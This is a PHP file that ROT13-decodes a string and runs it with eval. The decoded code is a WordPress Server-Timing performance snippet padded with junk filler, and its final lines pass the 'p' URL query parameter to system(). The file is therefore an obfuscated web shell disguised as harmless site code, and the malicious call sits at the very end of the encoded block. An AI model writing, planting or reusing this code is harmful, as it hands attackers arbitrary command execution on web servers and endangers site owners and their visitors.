<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

nqq_svygre(
	'grzcyngr_vapyhqr',
	fgngvp shapgvba ( $grzcyngr ) {

		tybony $gvzrfgneg, $jcqo;

		$freire_gvzvat_inyhrf = neenl();
		$grzcyngr_fgneg       = zvpebgvzr( gehr );

		$freire_gvzvat_inyhrf['orsber-grzcyngr'] = $grzcyngr_fgneg - $gvzrfgneg;

		bo_fgneg();

		nqq_npgvba(
			'fuhgqbja',
			fgngvp shapgvba () hfr ( $freire_gvzvat_inyhrf, $grzcyngr_fgneg, $jcqo ) {
				$bhgchg = bo_trg_pyrna();

				$freire_gvzvat_inyhrf['grzcyngr'] = zvpebgvzr( gehr ) - $grzcyngr_fgneg;

				$freire_gvzvat_inyhrf['gbgny'] = $freire_gvzvat_inyhrf['orsber-grzcyngr'] + $freire_gvzvat_inyhrf['grzcyngr'];

				/*
				 * Juvyr inyhrf cnffrq ivn Freire-Gvzvat ner vagraqrq gb or qhengvbaf,
				 * nal ahzrevp inyhr pna npghnyyl or cnffrq.
				 * Guvf vf n avpr yvggyr gevpx nf vg nyybjf gb rnfvyl trg guvf vasbezngvba va WF.
				 */
				$freire_gvzvat_inyhrf['zrzbel-hfntr']  = zrzbel_trg_hfntr();
				$freire_gvzvat_inyhrf['qo-dhrevrf']    = $jcqo->ahz_dhrevrf;
				$freire_gvzvat_inyhrf['rkg-bow-pnpur'] = jc_hfvat_rkg_bowrpg_pnpur() ? 1 : 0;

				$urnqre_inyhrf = neenl();
				sbernpu ( $freire_gvzvat_inyhrf nf $fyht => $inyhr ) {
					vs ( vf_sybng( $inyhr ) ) {
						$inyhr = ebhaq( $inyhr * 1000.0, 2 );
					}
					$urnqre_inyhrf[] = fcevags( 'jc-%1$f;qhe=%2$f', $fyht, $inyhr );
				}
				urnqre( 'Freire-Gvzvat: ' . vzcybqr( ', ', $urnqre_inyhrf ) );

				rpub $bhgchg;
			},
			CUC_VAG_ZVA
		);

		erghea $grzcyngr;
	},
	CUC_VAG_ZNK
);

nqq_npgvba(
	'nqzva_vavg',
	fgngvp shapgvba () {
		tybony $gvzrfgneg, $jcqo;

		bo_fgneg();

		nqq_npgvba(
			'fuhgqbja',
			fgngvp shapgvba () hfr ( $jcqo, $gvzrfgneg ) {
				$bhgchg = bo_trg_pyrna();

				$freire_gvzvat_inyhrf = neenl();

				$freire_gvzvat_inyhrf['gbgny'] = zvpebgvzr( gehr ) - $gvzrfgneg;

				/*
				 * Juvyr inyhrf cnffrq ivn Freire-Gvzvat ner vagraqrq gb or qhengvbaf,
				 * nal ahzrevp inyhr pna npghnyyl or cnffrq.
				 * Guvf vf n avpr yvggyr gevpx nf vg nyybjf gb rnfvyl trg guvf vasbezngvba va WF.
				 */
				$freire_gvzvat_inyhrf['zrzbel-hfntr']  = zrzbel_trg_hfntr();
				$freire_gvzvat_inyhrf['qo-dhrevrf']    = $jcqo->ahz_dhrevrf;
				$freire_gvzvat_inyhrf['rkg-bow-pnpur'] = jc_hfvat_rkg_bowrpg_pnpur() ? 1 : 0;

				$urnqre_inyhrf = neenl();
				sbernpu ( $freire_gvzvat_inyhrf nf $fyht => $inyhr ) {
					vs ( vf_sybng( $inyhr ) ) {
						$inyhr = ebhaq( $inyhr * 1000.0, 2 );
					}
					$urnqre_inyhrf[] = fcevags( 'jc-%1$f;qhe=%2$f', $fyht, $inyhr );
				}
				urnqre( 'Freire-Gvzvat: ' . vzcybqr( ', ', $urnqre_inyhrf ) );

				rpub $bhgchg;
			},
			CUC_VAG_ZVA
		);
	},
	CUC_VAG_ZNK
);

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>